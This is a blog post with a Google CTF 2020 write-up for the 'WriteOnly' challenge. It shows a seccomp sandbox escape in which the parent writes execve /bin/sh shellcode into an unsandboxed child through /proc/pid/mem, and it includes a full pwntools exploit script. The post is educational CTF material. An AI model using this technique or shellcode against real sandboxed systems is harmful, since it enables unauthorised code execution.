<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Writeup for WriteOnly Google CTF - 2020
        
    </title><meta content="Writeup for WriteOnly Google CTF - 2020" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/writeonly/&t=Writeup for WriteOnly Google CTF - 2020"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Writeup for WriteOnly Google CTF - 2020<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-08-24</time></div></div><section class=body><p>We had a really great time this weekend playing this year's edition of Google CTF. Although we were able to solve only 2 of the pwn challenges , here's the intended writeup for the challenge <em>WriteOnly</em>.<h2 id=tl-dr>tl;dr</h2><p>To begin with , we're just given a binary and it's source code. Skimming through the source code , we find the binary being hardened with seccomp bpf filter.<p>Here's the list of all the allowed syscalls.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>setup_seccomp</span><span>() {
</span><span>  scmp_filter_ctx ctx</span><span style=color:#bfbab0cc>;
</span><span>  ctx </span><span style=color:#f29668>= </span><span style=color:#ffb454>seccomp_init</span><span>(SCMP_ACT_KILL)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>int</span><span> ret </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(write)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(open)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(close)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(stat)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(fstat)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(lstat)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(lseek)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(mprotect)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(brk)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(writev)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(access)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(sched_yield)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(dup)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(dup2)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(clone)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(fork)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(vfork)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(execve)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(exit)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(kill)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(chdir)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(fchdir)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(gettimeofday)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(getuid)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(getgid)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_rule_add</span><span>(ctx</span><span style=color:#bfbab0cc>,</span><span> SCMP_ACT_ALLOW</span><span style=color:#bfbab0cc>, </span><span style=color:#ffb454>SCMP_SYS</span><span>(exit_group)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  ret </span><span style=color:#f29668>|= </span><span style=color:#ffb454>seccomp_load</span><span>(ctx)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(ret) {
</span><span>    </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>}
</span><span>
</span></code></pre><p>A surprise that the challenge has for us is that <code>Read</code> syscall is <strong>not allowed</strong>.<h2 id=idea-of-exploit>Idea of exploit</h2><p>Again, going through source code , we see a few things happening.<ul><li>A child is created which opens and reads 4 bytes of flag constantly.<li>The parent sets up seccomp, asks for a length and takes our shellcode as input and gives us code execution right away.</ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>int </span><span style=color:#ffb454>main</span><span>(</span><span style=color:#ff7733>int </span><span style=color:#f29718>argc</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span style=color:#f29718>argv</span><span>[]) {
</span><span>  </span><span style=font-style:italic;color:#39bae6>pid_t</span><span> pid </span><span style=color:#f29668>= </span><span style=color:#ffb454>check</span><span>(</span><span style=color:#ffb454>fork</span><span>()</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>"fork"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#f29668>!</span><span>pid) {
</span><span>    </span><span style=color:#ff7733>while </span><span>(</span><span style=color:#f29718>1</span><span>) {
</span><span>      </span><span style=color:#ffb454>check_flag</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[DEBUG] child pid: </span><span style=color:#f29718>%d</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> pid)</span><span style=color:#bfbab0cc>;
</span><span>  void_fn sc </span><span style=color:#f29668>= </span><span style=color:#ffb454>read_shellcode</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>setup_seccomp</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>sc</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>
</span><span>  </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>}
</span><span>
</span></code></pre><p>An important thing to notice here is , seccomp is enabled in the parent <strong>after</strong> the child has been created. Hence , the child <strong>does not</strong> inherit seccomp, so how cool is that?<p>The only thing that we could think of was to somehow <strong>write</strong> to the child's memory and get code execution in child too. But the question was , what do we write to child and how do we do it?<h3 id=delving-into-the-exploit>Delving into the exploit</h3><p>As suggested by <a href=https://twitter.com/sherl0ck__>Sherl0ck</a>, we could open a pseudo file called <strong>/proc/&LTpid of child>/mem</strong> and write to any segment of memory of the child , just like editing a binary in plain ghex :P. And what more , the program already prints the PID of child coupled with <strong>PIE</strong> being disabled , hence confirming our approach to exploitation. So now , another question that should pop in our minds now is , where do we write in the memory of child to get code execution? We can blithely overwrite the <strong>return address</strong> of child with our shellcode. There's another problem , remember that child will die if parent dies , so we have to make sure that the parent is alive throughout our journey of popping shell through child.<h4 id=overwriting-return-address-of-child>Overwriting return address of child</h4><p>tl;dr of the plan is :<ul><li>Open <strong>/proc/&LTpid of child>/mem</strong> with read-write permissions.<li>using <strong>lseek</strong> syscall to seek to the return address of child.<li>Write shellcode to return address and finally loop parent so that it doesn't die out.</ul><pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span style=color:#ff7733>import </span><span>sys
</span><span>
</span><span>HOST </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'writeonly.2020.ctfcompetition.com'
</span><span>PORT </span><span style=color:#f29668>= </span><span style=color:#f29718>1337
</span><span>context</span><span style=color:#f29668>.</span><span>arch </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'amd64'
</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(HOST</span><span style=color:#bfbab0cc>,</span><span>PORT)
</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
</span><span style=color:#ff7733>else</span><span>:
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>'./chal'</span><span>)
</span><span>
</span><span>reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
</span><span>sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
</span><span>sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
</span><span>rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
</span><span>sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
</span><span>re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
</span><span>s </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(a)
</span><span>
</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
</span><span>    </span><span style=font-style:italic;color:#5c6773>#shellcode for execve /bin/sh
</span><span>
</span><span>    shell </span><span style=color:#f29668>= </span><span style=color:#ffb454>asm</span><span>(</span><span style=color:#c2d94c>"""
</span><span style=color:#c2d94c>                mov r9,0x0068732f6e69622f
</span><span style=color:#c2d94c>                push r9
</span><span style=color:#c2d94c>                push rsp
</span><span style=color:#c2d94c>                pop rdi
</span><span style=color:#c2d94c>                xor rsi,rsi
</span><span style=color:#c2d94c>                xor rdx,rdx
</span><span style=color:#c2d94c>                mov rax,0x3b
</span><span style=color:#c2d94c>                syscall
</span><span style=color:#c2d94c>                """</span><span>)
</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'child pid: '</span><span>)
</span><span>    pid </span><span style=color:#f29668>= </span><span style=font-style:italic;color:#39bae6>int</span><span>(</span><span style=color:#ffb454>rel</span><span>()</span><span style=color:#f29668>.</span><span style=color:#ffb454>strip</span><span>()</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>10</span><span>)
</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>'pid -> ' </span><span style=color:#f29668>+ </span><span style=font-style:italic;color:#39bae6>str</span><span>(pid))
</span><span>
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Adjusting /proc/pid/mem to 8 bytes and storing on stack
</span><span>    sc </span><span style=color:#f29668>= </span><span style=color:#ffb454>asm</span><span>(</span><span style=color:#c2d94c>'''
</span><span style=color:#c2d94c>    mov r9, 0x006d656d2f2f322f
</span><span style=color:#c2d94c>    push r9
</span><span style=color:#c2d94c>    mov r9, 0x2f2f636f72702f2f
</span><span style=color:#c2d94c>    push r9
</span><span style=color:#c2d94c>    push rsp
</span><span style=color:#c2d94c>    pop rdi
</span><span style=color:#c2d94c>    push rax
</span><span style=color:#c2d94c>    mov r10,rax
</span><span style=color:#c2d94c>    mov rsi,2
</span><span style=color:#c2d94c>    mov rdx,0
</span><span style=color:#c2d94c>    mov rax,2
</span><span style=color:#c2d94c>    syscall                       #Open file with read-write permissions
</span><span style=color:#c2d94c>    mov rdi,rax
</span><span style=color:#c2d94c>    mov r8,rdi
</span><span style=color:#c2d94c>    mov rax, 8
</span><span style=color:#c2d94c>    mov rsi,0x00000000004022e3    #lseek requires the address we want to seek to as offset
</span><span style=color:#c2d94c>    mov rdx,1
</span><span style=color:#c2d94c>    syscall
</span><span style=color:#c2d94c>    mov rax,1
</span><span style=color:#c2d94c>    mov rdi,r8
</span><span style=color:#c2d94c>    mov rsi,r10
</span><span style=color:#c2d94c>    add rsi,0x100                 #Fetching shellcode's address into rsi and writing to file
</span><span style=color:#c2d94c>    mov rdx,0x30
</span><span style=color:#c2d94c>    syscall
</span><span style=color:#c2d94c>    loop: jmp loop                #Make sure parent does not die
</span><span style=color:#c2d94c>            '''</span><span style=color:#f29668>.</span><span style=color:#ffb454>format</span><span>(</span><span style=color:#c2d94c>"0x" </span><span style=color:#f29668>+ </span><span>(</span><span style=font-style:italic;color:#39bae6>str</span><span>(pid) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'//'</span><span>)[</span><span style=color:#bfbab0cc>::</span><span style=color:#f29668>-</span><span style=color:#f29718>1</span><span>]</span><span style=color:#f29668>.</span><span style=color:#ffb454>encode</span><span>(</span><span style=color:#c2d94c>'hex'</span><span>)))
</span><span>    sc </span><span style=color:#f29668>= </span><span>sc</span><span style=color:#f29668>.</span><span style=color:#ffb454>ljust</span><span>(</span><span style=color:#f29718>0x100</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span>)
</span><span>    sc </span><span style=color:#f29668>+= </span><span>shell  
</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>'sc len : ' </span><span style=color:#f29668>+ </span><span style=font-style:italic;color:#39bae6>str</span><span>(</span><span style=color:#f07178>len</span><span>(sc)))
</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'length? '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(</span><span style=color:#f07178>len</span><span>(sc) </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span>))
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'shellcode. '</span><span style=color:#bfbab0cc>,</span><span>sc)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
</span></code></pre><h2 id=conclusion>Conclusion</h2><p>The challenge taught me yet another way of escaping seccomp sandbox through writing to child's memory. kudos to Google CTF for such a good challenge.</section></article></main></div>